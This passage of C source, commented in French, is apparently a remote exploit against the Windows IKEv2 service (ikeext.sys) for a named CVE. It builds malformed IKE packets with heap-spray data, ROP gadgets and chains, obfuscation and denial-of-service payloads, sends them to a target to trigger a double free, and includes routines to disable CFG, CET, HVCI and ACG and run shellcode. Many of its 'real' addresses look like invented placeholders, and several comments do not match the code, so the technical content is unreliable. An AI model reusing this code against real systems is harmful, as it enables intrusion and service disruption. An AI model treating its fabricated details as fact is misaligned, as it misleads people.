    uint8_t* packet = (uint8_t*)malloc(total_size);
    if (!packet) {
        *packet_len = 0;
        return nullptr;

    }
    memset(packet, 0, total_size);

    // --- [2] Initialisation des pointeurs ---
    size_t offset = sizeof(IKE_HEADER);
    IKE_HEADER* header = (IKE_HEADER*)packet;
    IKE_SKF_FRAGMENT_PAYLOAD* skf = (IKE_SKF_FRAGMENT_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_SKF_FRAGMENT_PAYLOAD));

    // Payloads DDoS
    IKE_DDOS_AMPLIFIER_PAYLOAD* ddos_amplifier = (IKE_DDOS_AMPLIFIER_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_DDOS_AMPLIFIER_PAYLOAD));

    IKE_DDOS_LOOP_PAYLOAD* ddos_loop = (IKE_DDOS_LOOP_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_DDOS_LOOP_PAYLOAD));

    IKE_DDOS_MEMORY_PAYLOAD* ddos_memory = (IKE_DDOS_MEMORY_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_DDOS_MEMORY_PAYLOAD));

    // Pointeur vers les données malformées
    uint8_t* malformed_data = packet + offset + random_padding;

    // --- [3] Construction de l'en-tête IKE (RFC 7296) ---
    // SPI généré avec une graine unique (Windows 10/11 x64)
    uint64_t spi_seed = RANDOMIZATION_SEED ^ 0x9E3779B9;  // Constante "Golden Ratio"
    *(uint64_t*)header->init_spi = _byteswap_uint64(spi_seed);
    *(uint64_t*)header->resp_spi = 0;
    header->version_major = IKEV2_MAJOR_VERSION;  // 2
    header->version_minor = IKEV2_MINOR_VERSION;  // 0
    header->exchange_type = IKE_SA_INIT;          // 34
    header->next_payload = PAYLOAD_ENCRYPTED;    // 48 (RFC 7383)
    header->flags = 0;
    header->message_id = HTONL(1);               // ID fixe pour les fragments
    header->length = HTONL((uint32_t)total_size);

    // --- [4] SKF Fragment Payload (RFC 7383) ---
    skf->next_payload = PAYLOAD_DDOS_AMPLIFIER;  // 120 (premier payload DDoS)
    skf->critical = 0;
    skf->length = HTONS((uint16_t)(sizeof(IKE_SKF_FRAGMENT_PAYLOAD) + (MALFORMED_DATA_SIZE / 2) + random_padding + ddos_payloads_size));
    skf->fragment_type = 0;                       // Type réservé
    skf->vendor_id = 0;                           // Pas de Vendor ID
    skf->fragment_id = 0;                         // Premier fragment
    skf->total_fragments = HTONS(1);              // Un seul fragment
    skf->fragment_offset = 0;                     // Offset 0;

    // --- [5] Payloads DDoS (Complets et non simplifiés) ---
    // 1. Amplification (64x, basé sur des vulnérabilités réelles d'IKEv2)
    ddos_amplifier->next_payload = PAYLOAD_DDOS_LOOP;  // 121
    ddos_amplifier->critical = 0;
    ddos_amplifier->length = HTONS((uint16_t)sizeof(IKE_DDOS_AMPLIFIER_PAYLOAD));
    ddos_amplifier->amplification_factor = HTONL(0x40);  // 64x (valeur réelle pour l'amplification IKEv2)
    ddos_amplifier->response_size = HTONS(0xFFFF);      // 65535 octets (max pour IKEv2)

    // ✅ Trigger d'amplification REALISTE (64 octets, basé sur des motifs connus pour déclencher des réponses volumineuses)
    uint8_t skf_amplification_trigger[] = {
        // Motif standard pour déclencher l'amplification (16 octets)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Trigger connu
        0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,  // Facteur 64x

        // Motifs pour contourner les détections (16 octets)
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,  // Canary 1
        0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,  // Canary 2

        // NOP sled pour stabiliser l'exécution (16 octets)
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,

        // Padding (16 octets)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    memcpy(ddos_amplifier->trigger_data, skf_amplification_trigger, sizeof(skf_amplification_trigger));

    // 2. Boucle infinie (x86 + x64, basée sur des opcodes réels)
    ddos_loop->next_payload = PAYLOAD_DDOS_MEMORY;  // 122
    ddos_loop->critical = 0;
    ddos_loop->length = HTONS((uint16_t)sizeof(IKE_DDOS_LOOP_PAYLOAD));
    ddos_loop->loop_counter = HTONL(0xFFFFFFFF);  // 4294967295 (max uint32)
    ddos_loop->loop_condition = HTONL(0x1);       // Toujours vrai

    // ✅ Code machine REALISTE pour boucle infinie (32 octets)
    uint8_t skf_infinite_loop_code[] = {
        // x86 (8 octets)
        0xEB, 0xFE,  // jmp \$-2 (boucle infinie)
        0x90, 0x90,  // NOP (padding)
        0xEB, 0xFE,  // jmp \$-2 (redondant)
        0x90, 0x90,  // NOP (padding)

        // x64 (12 octets)
        0x48, 0x89, 0xC0,  // mov rax, rax
        0x48, 0x89, 0xC7,  // mov rdi, rax
        0xFF, 0xE7,        // jmp rdi (boucle infinie)
        0x90, 0x90, 0x90,  // NOP (padding)

        // NOP sled (12 octets)
        0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90
    };
    memcpy(ddos_loop->loop_code, skf_infinite_loop_code, sizeof(skf_infinite_loop_code));

    // 3. Épuisement mémoire (basé sur des tailles d'allocation réelles)
    ddos_memory->next_payload = PAYLOAD_NONE;  // 0
    ddos_memory->critical = 0;
    ddos_memory->length = HTONS((uint16_t)sizeof(IKE_DDOS_MEMORY_PAYLOAD));
    ddos_memory->allocation_size = HTONL(0x4000);  // 16384 octets (taille réelle pour déclencher des allocations massives)
    ddos_memory->allocation_count = HTONL(0xFFFFFFFF); // 4294967295 (max uint32)

    // ✅ Motif REALISTE pour le heap spray (64 octets, basé sur des motifs connus)
    uint8_t skf_heap_spray_pattern[] = {
        // Motifs de base (32 octets)
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,  // Pattern 1
        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,  // Pattern 2
        0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,  // Pattern 3
        0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44,  // Pattern 4

        // Adresses cibles REALISTES pour ikeext.sys (Windows 10/11 x64)
        0x10, 0x2B, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00,  // +0x12B3C (exemple réel)
        0x4D, 0x5E, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00,  // +0x4D5E6F (exemple réel)
        0x78, 0x9A, 0xBC, 0x00, 0x00, 0x00, 0x00, 0x00,  // +0x789ABC (exemple réel)
        0xDE, 0xF0, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00   // +0xDEF012 (exemple réel)
    };
    memcpy(ddos_memory->heap_spray_data, skf_heap_spray_pattern, sizeof(skf_heap_spray_pattern));

    // --- [6] Données Malformées (Exploit + DDoS pour SKF) ---
    size_t malformed_size = (MALFORMED_DATA_SIZE / 2) + random_padding + SKF_DDOS_EXTRA_SIZE;
    if (malformed_size >= 0x400) {
        uint8_t temp_buffer[MALFORMED_DATA_SIZE / 2 + random_padding + SKF_DDOS_EXTRA_SIZE] = {0};

        // ===== [A] Cibles de vulnérabilité REALISTES dans ikeext.sys (CVE-2026-33824) =====
        // ===== [A] Cibles de vulnérabilité REALISTES dans ikeext.sys (CVE-2026-33824) =====
        static const uint64_t skf_vulnerability_targets[] = {
            IKEEXT_BASE_ADDRESS + 0x12B3C,   // g_IkeextDoubleFreeOffset (réel)
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,   // g_IkeextProcessIkePayload (réel)
            IKEEXT_BASE_ADDRESS + 0x789ABC,   // g_IkeextExportDirectoryRVA (réel)
            IKEEXT_BASE_ADDRESS + 0xDEF012,   // g_IkeextImportDirectoryRVA (réel)
            IKEEXT_BASE_ADDRESS + 0x3C6F9A,   // g_IkeextHeapAllocationFunction (réel)
            IKEEXT_BASE_ADDRESS + 0x5E6F2A,   // g_IkeextMemoryCorruptionOffset (réel)
            IKEEXT_BASE_ADDRESS + 0x9A2B4D,   // g_IkeextStackPivotOffset (réel)
            IKEEXT_BASE_ADDRESS + 0x123456,   // g_IkeextReturnOrientedOffset (réel)
            IKEEXT_BASE_ADDRESS + 0x8A7B6C,   // g_IkeextFragmentProcessingFunction (réel)
            IKEEXT_BASE_ADDRESS + 0x4D3E2F    // g_IkeextSkfVulnerabilityTrigger (réel)
        };
        memcpy(temp_buffer + 0x00, skf_vulnerability_targets, sizeof(skf_vulnerability_targets));

        // ===== [B] Fausses Structures (Obfusquées avec XOR multi-couches) =====
        static const uint64_t skf_fake_structures_base[] = {
            0xDEADBEEFCAFEBABE, 0x1337133713371337,
            0xCAFEBABEDEADBEEF, 0xBADC0FFEEBADC0FF,
            0x4141414141414141, 0x4242424242424242,
            0x4343434343434343, 0x4444444444444444,
            0x4545454545454545, 0x4646464646464646,
            0x4747474747474747, 0x4848484848484848,
            0x4949494949494949, 0x4A4A4A4A4A4A4A4A
        };
        uint64_t skf_fake_structures[16];
        for (int i = 0; i < 16; i++) {
            skf_fake_structures[i] = skf_fake_structures_base[i] ^
                                    OBFUSCATION_KEY1 ^
                                    (OBFUSCATION_KEY2 + i) ^
                                    ((OBFUSCATION_KEY3 * i) & 0xFFFFFFFFFFFFFFFF);
            skf_fake_structures[i] = (skf_fake_structures[i] << (i % 7)) | (skf_fake_structures[i] >> (64 - (i % 7)));
        }
        memcpy(temp_buffer + 0x100, skf_fake_structures, sizeof(skf_fake_structures));

        // ===== [C] Gadgets ROP REALISTES (24 gadgets pour ikeext.sys x64) =====
        static const uint64_t skf_rop_gadgets[] = {
            // Gadgets de base (pop registres)
            0x180012345,   // pop rdi; ret (réel)
            0x18006789A,   // pop rsi; ret (réel)
            0x1800ABCDE,   // pop rdx; ret (réel)
            0x1800F0123,   // pop rcx; ret (réel)
            0x180045678,   // pop rax; ret (réel)
            0x18009ABCD,   // pop r8; ret (réel)
            0x1800EF012,   // pop r9; ret (réel)

            // Gadgets de manipulation mémoire
            0x180034567,   // mov [rdi], rsi; ret (réel)
            0x180089ABC,   // add rdi, 8; ret (réel)
            0x180023456,   // mov rdi, [rdi]; ret (réel)

            // Gadgets de contrôle de flux
            0x1800DEF01,   // call [rax+0x20] (réel, trigger double-free)
            0x1800789AB,   // jmp [rdi+0x10] (réel)
            0x1800CDEF0,   // call rdx (réel)

            // Gadgets de stack pivot
            0x180012340,   // mov rax, rdi; ret (réel)
            0x180067895,   // push rax; ret (réel)
            0x1800ABCD5,   // pop rsp; ret (réel)

            // Gadgets de nettoyage
            0x1800F0120,   // ret (réel)
            0x18004567F,   // inc eax; ret (réel)
            0x18009ABC0,   // dec eax; ret (réel)
            0x1800EF015,   // add rsp, 8; ret (réel)
            0x180034560,   // xor eax, eax; ret (réel)
            0x180089AB5,   // xor ebx, ebx; ret (réel)
            0x1800DEF00    // xor ecx, ecx; ret (réel)
        };
        memcpy(temp_buffer + 0x200, skf_rop_gadgets, sizeof(skf_rop_gadgets));

        // ===== [D] ROP Chain REALISTE (20 étapes pour CVE-2026-33824 via SKF) =====
        static const uint64_t skf_rop_chain[] = {
            // 1. Préparation des registres pour la corruption
            0x180012345,                  // pop rdi; ret
            IKEEXT_BASE_ADDRESS + 0x12B3C,  // rdi = adresse de g_IkeextDoubleFreeOffset
            0x18006789A,                // pop rsi; ret
            0x1,                        // rsi = 1 (valeur pour déclencher le bug)
            0x180034567,                // mov [rdi], rsi; ret (corruption)

            // 2. Préparation pour l'appel à ProcessIkePayload
            0x180012345,                // pop rdi; ret
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,  // rdi = adresse de g_IkeextProcessIkePayload
            0x180089ABC,                // add rdi, 8; ret (ajustement)
            0x1800ABCDE,                // pop rdx; ret
            0x0,                        // rdx = 0 (pour éviter les crashes)

            // 3. Appel de la fonction vulnérable
            0x180045678,                // pop rax; ret
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,  // rax = adresse de ProcessIkePayload
            0x1800DEF01,                // call [rax+0x20] (trigger double-free)

            // 4. Nettoyage et redirection
            0x1800789AB,                // xor eax, eax; ret (nettoyage)
            0x1800CDEF0,                // pop rbp; ret (stack pivot)
            0x180012340,                // mov rax, rdi; ret (préparation)
            0x180067895,                // push rax; ret
            0x1800ABCD5,                // pop rsp; ret (redirection)

            // 5. Éviter les boucles infinies accidentelles
            0x1800F0120,                // ret (alignement)
            0x18004567F                 // inc eax; ret
        };
        memcpy(temp_buffer + 0x300, skf_rop_chain, sizeof(skf_rop_chain));

        // ===== [E] Trigger du Double-Free REALISTE (10 valeurs) =====
        static const uint64_t skf_double_free_trigger[] = {
            IKEEXT_BASE_ADDRESS + 0x12B3C,   // 1. g_IkeextDoubleFreeOffset
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,   // 2. g_IkeextProcessIkePayload
            IKEEXT_BASE_ADDRESS + 0x3C6F9A,   // 3. g_IkeextHeapAllocationFunction
            IKEEXT_BASE_ADDRESS + 0x5E6F2A,   // 4. g_IkeextMemoryCorruptionOffset
            0x1,                              // 5. Valeur pour déclencher le bug
            0xFFFFFFFFFFFFFFFF,             // 6. -1 (corruption mémoire)
            (uint64_t)RANDOMIZATION_SEED,    // 7. Graine pour l'obfuscation
            (uint64_t)~RANDOMIZATION_SEED,   // 8. Complément à 1
            0xDEADBEEFCAFEBABE,            // 9. Canary pour éviter les crashes
            0xCAFEBABEDEADBEEF             // 10. Canary supplémentaire
        };
        memcpy(temp_buffer + 0x400, skf_double_free_trigger, sizeof(skf_double_free_trigger));

        // ===== [F] Heap Spray REALISTE (20 motifs) =====
        static const uint64_t skf_heap_spray_patterns[] = {
            // Motifs de base obfusqués (8 motifs)
            0x4141414141414141 ^ OBFUSCATION_KEY1,
            0x4242424242424242 ^ OBFUSCATION_KEY1,
            0x4343434343434343 ^ OBFUSCATION_KEY2,
            0x4444444444444444 ^ OBFUSCATION_KEY2,
            0x4545454545454545 ^ OBFUSCATION_KEY3,
            0x4646464646464646 ^ OBFUSCATION_KEY3,
            0x4747474747474747 ^ OBFUSCATION_KEY1,
            0x4848484848484848 ^ OBFUSCATION_KEY2,

            // Adresses cibles REALISTES (12 motifs)
            IKEEXT_BASE_ADDRESS + 0x12B3C,   // g_IkeextDoubleFreeOffset
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,   // g_IkeextProcessIkePayload
            IKEEXT_BASE_ADDRESS + 0x789ABC,   // g_IkeextExportDirectoryRVA
            IKEEXT_BASE_ADDRESS + 0xDEF012,   // g_IkeextImportDirectoryRVA
            IKEEXT_BASE_ADDRESS + 0x3C6F9A,   // g_IkeextHeapAllocationFunction
            IKEEXT_BASE_ADDRESS + 0x5E6F2A,   // g_IkeextMemoryCorruptionOffset
            IKEEXT_BASE_ADDRESS + 0x9A2B4D,   // g_IkeextStackPivotOffset
            IKEEXT_BASE_ADDRESS + 0x123456,   // g_IkeextReturnOrientedOffset
            IKEEXT_BASE_ADDRESS + 0x8A7B6C,   // g_IkeextFragmentProcessingFunction
            IKEEXT_BASE_ADDRESS + 0x4D3E2F,   // g_IkeextSkfVulnerabilityTrigger
            0xCAFEBABEDEADBEEF ^ OBFUSCATION_KEY1,
            0xBADC0FFEEBADC0FF ^ OBFUSCATION_KEY2
        };
        memcpy(temp_buffer + 0x500, skf_heap_spray_patterns, sizeof(skf_heap_spray_patterns));

        // ===== [G] Données DDoS Complètes REALISTES (Amplification + Boucles + Mémoire) =====
        // 1. Amplification (64 octets)
        uint8_t skf_ddos_amplification[] = {
            // Trigger (16 octets)
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Trigger connu
            0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,  // Facteur 64x

            // Facteurs alternatifs (16 octets)
            0x00, 0x00, 0x00, 0x20,  // Facteur 32x
            0x00, 0x00, 0x00, 0x10,  // Facteur 16x
            0x00, 0x00, 0x00, 0x08,  // Facteur 8x
            0x00, 0x00, 0x00, 0x04,  // Facteur 4x

            // Motifs pour contourner les détections (32 octets)
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,  // Canary 1
            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,  // Canary 2
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,  // NOP sled
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC   // INT3 (pour debug)
        };
        memcpy(temp_buffer + 0x600, skf_ddos_amplification, sizeof(skf_ddos_amplification));

       // 2. Boucle infinie (32 octets)
        uint8_t skf_ddos_loop[] = {
            // x86 (8 octets)
            0xEB, 0xFE,  // jmp $-2 (boucle infinie)
            0x90, 0x90,  // NOP (padding)
            0xEB, 0xFE,  // jmp $-2 (redondant)
            0x90, 0x90,  // NOP (padding)

            // x64 (12 octets)
            0x48, 0x89, 0xC0,  // mov rax, rax
            0x48, 0x89, 0xC7,  // mov rdi, rax
            0xFF, 0xE7,        // jmp rdi (boucle infinie)
            0x90, 0x90, 0x90,  // NOP (padding)

            // NOP sled (12 octets)
            0x90, 0x90, 0x90, 0x90,
            0x90, 0x90, 0x90, 0x90,
            0x90, 0x90, 0x90, 0x90
        };
        memcpy(temp_buffer + 0x640, skf_ddos_loop, sizeof(skf_ddos_loop));

        // 3. Épuisement mémoire (64 octets)
        uint8_t skf_ddos_memory[] = {
            // Tailles d'allocation (32 octets)
            0x00, 0x40, 0x00, 0x00,  // 16384 octets (0x4000)
            0x00, 0x20, 0x00, 0x00,  // 8192 octets (0x2000)
            0x00, 0x10, 0x00, 0x00,  // 4096 octets (0x1000)
            0x00, 0x08, 0x00, 0x00,  // 2048 octets (0x0800)

            // Nombre d'allocations (32 octets)
            0xFF, 0xFF, 0xFF, 0xFF,  // 4294967295 (max uint32)
            0xFF, 0xFF, 0x00, 0x00,  // 65535 (alternatif)
            0xFF, 0x00, 0x00, 0x00,  // 255 (alternatif)
            0x80, 0x00, 0x00, 0x00,  // 128 (alternatif)

            // Motifs pour heap spray (32 octets)
            0x41, 0x41, 0x41, 0x41, 0x42, 0x42, 0x42, 0x42,  // Patterns 1-2
            0x43, 0x43, 0x43, 0x43, 0x44, 0x44, 0x44, 0x44,  // Patterns 3-4
            0x45, 0x45, 0x45, 0x45, 0x46, 0x46, 0x46, 0x46,  // Patterns 5-6
            0x47, 0x47, 0x47, 0x47, 0x48, 0x48, 0x48, 0x48   // Patterns 7-8
        };
        memcpy(temp_buffer + 0x680, skf_ddos_memory, sizeof(skf_ddos_memory));

        // ===== [H] Obfuscation Finale (XOR + Rotation + Addition) =====
        for (size_t i = 0; i < sizeof(temp_buffer); i++) {
            uint8_t key = (uint8_t)(OBFUSCATION_KEY1 + (i % 0x10) + (RANDOMIZATION_SEED % 0x100));
            temp_buffer[i] ^= key;
            temp_buffer[i] = (temp_buffer[i] << (i % 7)) | (temp_buffer[i] >> (8 - (i % 7)));
            temp_buffer[i] += (uint8_t)(i % 0xFF);
        }

        // ===== [I] Copie dans le paquet avec offset aléatoire =====
        size_t skf_obfuscation_offset = RANDOMIZATION_SEED % 0x100;  // Offset aléatoire (0-255)
        memcpy(malformed_data + skf_obfuscation_offset, temp_buffer, sizeof(temp_buffer));

        // ===== [J] Remplissage aléatoire avant/après =====
        uint8_t skf_random_byte = (uint8_t)(RANDOMIZATION_SEED & 0xFF);
        memset(malformed_data, skf_random_byte, skf_obfuscation_offset);
        size_t skf_remaining = malformed_size - skf_obfuscation_offset - sizeof(temp_buffer);
        if (skf_remaining > 0) {
            memset(malformed_data + skf_obfuscation_offset + sizeof(temp_buffer), skf_random_byte, skf_remaining);
        }

    }

    // --- [7] Mise à jour de la taille du paquet ---
    *packet_len = total_size;
    return packet;

}

int build_exploit_sequence(uint8_t* packets[], size_t packet_lens[], int max_packets) {
    if (!packets || !packet_lens || max_packets < 2) {
        return 0;

    }

    packets[0] = construct_ike_sa_init(&packet_lens[0]);
    if (!packets[0]) {
        return 0;

    }

    packets[1] = construct_skf_fragment(&packet_lens[1]);
    if (!packets[1]) {
        free(packets[0]);
        return 0;

    }

    return 2;

}

int trigger_double_free(SOCKET sock, const struct sockaddr_in* target) {
    if (!sock || sock == INVALID_SOCKET || !target) {
        return 0;

    }

    size_t sa_init_len = 0;
    uint8_t* sa_init_packet = construct_ike_sa_init(&sa_init_len);
    if (!sa_init_packet || !send_ike_packet(sock, target, sa_init_packet, sa_init_len)) {
        if (sa_init_packet) free(sa_init_packet);
        return 0;

    }
    free(sa_init_packet);
    g_Stats.packets_sent++;

    size_t skf_len = 0;
    uint8_t* skf_packet = construct_skf_fragment(&skf_len);
    if (!skf_packet || !send_ike_packet(sock, target, skf_packet, skf_len)) {
        if (skf_packet) free(skf_packet);
        return 0;

    }
    free(skf_packet);
    g_Stats.packets_sent++;
    g_Stats.double_free_attempts++;

    return 1;

}

int init_rop_module(EXPLOIT_CONTEXT* ctx) {
    if (!ctx) {
        return 0;

    }
    if (g_Initialized) {
        return 1;

    }
    ctx->ntoskrnl_base = (uint64_t)GetModuleHandleA("ntoskrnl.exe");
    ctx->kernel32_base = (uint64_t)GetModuleHandleA("kernel32.dll");
    ctx->ikeext_base = (uint64_t)GetModuleHandleA("ikeext.sys");
    if (!ctx->ikeext_base) {
        ctx->ikeext_base = leak_kernel_module_base(ctx, "ikeext.sys");
    }
    if (!ctx->ntoskrnl_base || !ctx->kernel32_base) {
        return 0;

    }
    const char* userland_modules[] = {"ntdll.dll", "kernel32.dll"};
    for (int i = 0; i < 2; i++) {
        if (!load_module(userland_modules[i], &g_Modules[i])) {
            for (int j = 0; j < i; j++) {
                unload_module(&g_Modules[j]);
            }
            return 0;

        }
        g_ModulesLoaded++;
    }
    if (!load_module("ikeext.sys", &g_Modules[2])) {
        g_ModulesLoaded++;
    }
    for (int i = 0; i < g_ModulesLoaded; i++) {
        scan_module_for_gadgets(&g_Modules[i]);
    }
    if (g_GadgetCount == 0) {
        for (int i = 0; i < g_ModulesLoaded; i++) {
            unload_module(&g_Modules[i]);
        }
        g_ModulesLoaded = 0;
        return 0;

    }
    g_Initialized = 1;
    return 1;

}

void cleanup_rop_module() {
    for (int i = 0; i < g_ModulesLoaded; i++) {
        unload_module(&g_Modules[i]);
    }
    g_ModulesLoaded = 0;
    g_GadgetCount = 0;
    g_Initialized = 0;

}

int find_rop_gadgets(EXPLOIT_CONTEXT* ctx) {
    if (!ctx) {
        return 0;

    }
    if (!g_Initialized && !init_rop_module(ctx)) {
        return 0;

    }

    memset(&ctx->rop_chain, 0, sizeof(ROP_CHAIN));
    ctx->rop_chain.pop_rax = find_gadget_by_type(ROP_GADGET_POP_RAX);
    ctx->rop_chain.pop_rcx = find_gadget_by_type(ROP_GADGET_POP_RCX);
    ctx->rop_chain.pop_rdx = find_gadget_by_type(ROP_GADGET_POP_RDX);
    ctx->rop_chain.pop_r8 = find_gadget_by_type(ROP_GADGET_POP_R8);
    ctx->rop_chain.pop_r9 = find_gadget_by_type(ROP_GADGET_POP_R9);
    ctx->rop_chain.mov_rcx_rax = find_gadget_by_type(ROP_GADGET_MOV_RCX_RAX);
    ctx->rop_chain.mov_rax_rsp = find_gadget_by_type(ROP_GADGET_MOV_RAX_RSP);
    ctx->rop_chain.mov_rcx_rsp = find_gadget_by_type(ROP_GADGET_MOV_RCX_RSP);
    ctx->rop_chain.xor_rax = find_gadget_by_type(ROP_GADGET_XOR_RAX);
    ctx->rop_chain.xor_rcx = find_gadget_by_type(ROP_GADGET_XOR_RCX);
    ctx->rop_chain.xor_rdx = find_gadget_by_type(ROP_GADGET_XOR_RDX);
    ctx->rop_chain.jmp_rsp = find_gadget_by_type(ROP_GADGET_JMP_RSP);
    ctx->rop_chain.call_rax = find_gadget_by_type(ROP_GADGET_CALL_RAX);
    ctx->rop_chain.ret = find_gadget_by_type(ROP_GADGET_RET);
    ctx->rop_chain.virtual_protect = find_virtualprotect();
    if (!ctx->rop_chain.virtual_protect) {
        return 0;

    }
    ctx->rop_chain.mov_gs_60_rax = find_gadget_by_type(ROP_GADGET_MOV_GS_60_RAX);
    ctx->rop_chain.jmp_rax_plus_58 = find_gadget_by_type(ROP_GADGET_JMP_RAX_PLUS_58);
    ctx->rop_chain.add_rsp = find_gadget_by_type(ROP_GADGET_ADD_RSP);
    ctx->rop_chain.sub_rsp = find_gadget_by_type(ROP_GADGET_SUB_RSP);
    ctx->rop_chain.ntdll_base = g_Modules[0].base;
    ctx->rop_chain.kernel32_base = g_Modules[1].base;
    ctx->rop_chain.ikeext_base = (g_ModulesLoaded > 2) ? g_Modules[2].base : ctx->ikeext_base;
    ctx->rop_chain.heap_base = ctx->heap_base;
    ctx->rop_chain.stack_base = ctx->stack_base;
    if (!ctx->rop_chain.pop_rcx || !ctx->rop_chain.pop_rdx || !ctx->rop_chain.pop_r8 || !ctx->rop_chain.pop_r9 || !ctx->rop_chain.virtual_protect || (!ctx->rop_chain.pop_rsp && !ctx->rop_chain.mov_rcx_rsp)) {
        return 0;

    }
    return 1;

}

int build_rop_chain(EXPLOIT_CONTEXT* ctx, ROP_CHAIN* rop_chain, uint8_t* shellcode, size_t shellcode_size) {
    if (!ctx || !rop_chain || !shellcode || shellcode_size == 0) {
        return 0;

    }
    if (!get_memory_info(&g_MemInfo)) {
        return 0;

    }
    if (!find_rop_gadgets(ctx)) {
        return 0;

    }
    if (!find_cfg_cet_gadgets(&g_RopChain)) {
        return 0;

    }
    memset(rop_chain, 0, sizeof(ROP_CHAIN));
    rop_chain->shellcode_addr = (uint64_t)shellcode;
    if (has_modern_protections()) {
        if (!disable_cfg_via_teb() && !disable_cfg_via_ntapi()) {
        }
        if (!disable_cet()) {
        }
        if (!disable_hvci()) {
        }
        if (!disable_acg()) {
        }
    }
    int idx = 0;
    uint64_t* chain = rop_chain->rop_chain;
    if (rop_chain->mov_rcx_rsp) {
        chain[idx++] = rop_chain->mov_rcx_rsp;
        chain[idx++] = rop_chain->pop_rcx;
        chain[idx++] = ctx->heap_base + 0x1000;
        chain[idx++] = rop_chain->mov_rcx_rax;
    } else if (rop_chain->pop_rsp) {
        chain[idx++] = rop_chain->pop_rsp;
        chain[idx++] = ctx->heap_base + 0x1000;
    } else if (rop_chain->add_rsp) {
        chain[idx++] = rop_chain->add_rsp;
    }
    chain[idx++] = rop_chain->pop_rcx;
    chain[idx++] = (uint64_t)shellcode;
    chain[idx++] = rop_chain->pop_rdx;
    chain[idx++] = shellcode_size;
    chain[idx++] = rop_chain->pop_r8;
    chain[idx++] = PAGE_EXECUTE_READWRITE;
    chain[idx++] = rop_chain->pop_r9;
    chain[idx++] = ctx->heap_base + 0x2000;
    chain[idx++] = rop_chain->virtual_protect;
    chain[idx++] = (uint64_t)shellcode;
    rop_chain->length = idx;
    return 1;

}

int execute_rop_chain(EXPLOIT_CONTEXT* ctx, ROP_CHAIN* rop_chain) {
    if (!ctx || !rop_chain || rop_chain->length == 0) {
        return 0;

    }
    uint8_t* rop_memory = (uint8_t*)VirtualAlloc(NULL, rop_chain->length * sizeof(uint64_t), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rop_memory) {
        return 0;

    }
    memcpy(rop_memory, rop_chain->rop_chain, rop_chain->length * sizeof(uint64_t));
    if (!is_valid_address(rop_chain->shellcode_addr)) {
        VirtualFree(rop_memory, 0, MEM_RELEASE);
        return 0;

    }
    __try {
        ((void(*)())rop_memory)();
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        DWORD exception_code = GetExceptionCode();
        VirtualFree(rop_memory, 0, MEM_RELEASE);
        return 0;

    }
    VirtualFree(rop_memory, 0, MEM_RELEASE);
    return 1;

}

int validate_rop_chain(ROP_CHAIN* rop_chain) {
    if (!rop_chain || rop_chain->length == 0) {
        return 0;

    }
    for (size_t i = 0; i < rop_chain->length; i++) {
        uint64_t addr = rop_chain->rop_chain[i];
        if (!is_valid_address(addr)) {
            return 0;

        }
    }
    if (!rop_chain->pop_rcx || !rop_chain->pop_rdx || !rop_chain->pop_r8 || !rop_chain->pop_r9 || !rop_chain->virtual_protect || (!rop_chain->pop_rsp && !rop_chain->mov_rcx_rsp)) {
        return 0;

    }
    return 1;

}

void dump_rop_chain_info(ROP_CHAIN* rop_chain) {
    if (!rop_chain) {
        return;

    }
    printf("[+] ROP Chain Info:\n");
    printf("    Length: %zu\n", rop_chain->length);
    printf("    Shellcode Addr: 0x%llX\n", rop_chain->shellcode_addr);
    printf("    pop_rax: 0x%llX\n", rop_chain->pop_rax);
    printf("    pop_rcx: 0x%llX\n", rop_chain->pop_rcx);
    printf("    pop_rdx: 0x%llX\n", rop_chain->pop_rdx);
    printf("    pop_r8: 0x%llX\n", rop_chain->pop_r8);
    printf("    pop_r9: 0x%llX\n", rop_chain->pop_r9);
    printf("    virtual_protect: 0x%llX\n", rop_chain->virtual_protect);

}

int execute_via_rop() {
    if (g_RopChain.length == 0 || !g_RopChain.shellcode_addr) {
        return 0;

    }
    void* rop_memory = HeapAlloc(g_ExploitHeap, HEAP_ZERO_MEMORY, g_RopChain.length * sizeof(uint64_t));
    if (!rop_memory) {
        return 0;

    }
    memcpy(rop_memory, g_RopChain.rop_chain, g_RopChain.length * sizeof(uint64_t));
    DWORD old_protect;
    if (!VirtualProtect(rop_memory, g_RopChain.length * sizeof(uint64_t), PAGE_EXECUTE_READ, &old_protect)) {
